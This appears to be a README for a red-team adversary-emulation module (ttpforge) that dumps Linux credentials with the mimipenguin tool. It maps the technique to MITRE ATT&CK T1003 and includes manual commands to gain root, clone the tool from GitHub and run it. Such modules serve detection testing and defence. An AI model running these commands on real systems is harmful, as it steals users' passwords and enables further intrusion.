# Extract Credentials with Mimipenguin

![Meta TTP](https://img.shields.io/badge/Meta_TTP-blue)

This TTP enables the extraction of credentials from a target system using the mimipenguin tool.

## Pre-requisites

1. The executor must have access to the target system and be able to run commands as root.
1. The mimipenguin tool must be accessible via a remote repository.

## Examples

You can run the TTP using the following example:
```bash
ttpforge run forgearmory//credential-access/extract-credentials-with-mimipenguin/ttp.yaml
```

## Steps

1. **clone-mimipenguin**: This step clones the mimipenguin repository from GitHub. This will checkout commit 880a42714600b725eb185927775d67638bfc5b41. A cleanup step is also provided to remove the repository post-execution.
2. **run-mimipenguin**: This step runs the mimipenguin.sh script within the cloned repository. If the execution status is successful (0), the TTP exits with a success message. Otherwise, it exits with an error message.

## Manual Reproduction Steps

```
# Escalate privileges to root
sudo su

# Install mimipenguin
git clone https://github.com/huntergregal/mimipenguin.git

# Run mimipenguin
sudo bash mimipenguin.sh
```

## MITRE ATT&CK Mapping

- **Tactics**:
  - TA0006 Credential Access
- **Techniques**:
  - T1003 OS Credential Dumping
